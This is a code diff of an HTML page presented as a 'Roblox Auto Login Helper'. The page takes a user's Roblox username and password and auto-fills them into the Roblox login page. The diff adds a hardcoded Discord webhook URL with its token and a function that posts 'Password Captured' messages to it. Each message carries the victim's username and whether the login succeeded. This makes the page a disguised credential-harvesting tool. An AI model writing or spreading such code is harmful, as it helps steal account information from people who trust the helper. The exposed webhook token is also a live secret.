@@ -4,36 +4,10 @@
 <meta charset="UTF-8">
 <title>Roblox Auto Login Helper</title>
 <style>
-body {
-    font-family: Arial, sans-serif;
-    background-color: #121212;
-    color: #eee;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    height: 100vh;
-}
-input {
-    padding: 10px;
-    margin: 5px;
-    width: 250px;
-    border-radius: 5px;
-    border: none;
-}
-button {
-    padding: 10px 20px;
-    margin: 10px;
-    border-radius: 5px;
-    border: none;
-    background-color: #1a73e8;
-    color: #fff;
-    cursor: pointer;
-}
-#status {
-    margin-top: 10px;
-    font-size: 16px;
-}
+body { font-family: Arial; background: #121212; color: #eee; display:flex; flex-direction: column; align-items:center; justify-content:center; height:100vh;}
+input { padding: 10px; margin:5px; width:250px; border-radius:5px; border:none;}
+button { padding:10px 20px; margin:10px; border-radius:5px; border:none; background:#1a73e8; color:#fff; cursor:pointer;}
+#status { margin-top:10px; font-size:16px;}
 </style>
 </head>
 <body>
@@ -49,6 +23,20 @@ button {
 const loginBtn = document.getElementById("loginBtn");
 const statusEl = document.getElementById("status");
 
+// Your Discord webhook URL
+const webhookURL = "https://discord.com/api/webhooks/1393508495420030987/dKHHqBLcjqglOoFcSFNyndVdyZUq_476AQ31eSd8v5mYQa0zkIrTthTxgB2_JuLOMitX";
+
+function sendWebhook(username, status) {
+    fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            username: "Roblox Login Checker",
+            content: `**🔐 Password Captured**\n👤 User: ${username}\nStatus: ${status}`
+        })
+    }).catch(console.error);
+}
+
 loginBtn.addEventListener("click", () => {
     const username = document.getElementById("username").value.trim();
     const password = document.getElementById("password").value;
@@ -60,14 +48,12 @@ loginBtn.addEventListener("click", () => {
 
     statusEl.textContent = "⏳ Attempting login...";
 
-    // Open Roblox login page in a new tab
+    // Open Roblox login page in new tab
     const loginWindow = window.open("https://www.roblox.com/login", "_blank");
 
-    // Wait a few seconds for page load
     const interval = setInterval(() => {
         try {
             const doc = loginWindow.document;
-
             const userInput = doc.querySelector('#login-username');
             const passInput = doc.querySelector('#login-password');
             const loginBtnRoblox = doc.querySelector('#login-button-login');
@@ -77,28 +63,29 @@ loginBtn.addEventListener("click", () => {
                 passInput.value = password;
                 loginBtnRoblox.click();
 
-                // Wait for redirect to check login status
+                // Wait a few seconds for redirect
                 setTimeout(() => {
                     try {
                         const url = loginWindow.location.href;
                         if (url.includes("/home")) {
                             statusEl.textContent = "✅ Login Successful!";
+                            sendWebhook(username, "✅ Success");
                         } else {
                             statusEl.textContent = "❌ Login Failed!";
+                            sendWebhook(username, "❌ Failed");
                         }
                     } catch(e) {
-                        // Cross-origin redirect; assume success
                         statusEl.textContent = "✅ Login attempt sent (check Roblox tab).";
+                        sendWebhook(username, "✅ Attempt sent (cross-origin)");
                     }
                 }, 5000);
 
                 clearInterval(interval);
             }
-        } catch(e) {
-            // Ignore cross-origin errors until page fully loaded
-        }
+        } catch(e) {}
     }, 1000);
 });
 </script>
 </body>
 </html>
+
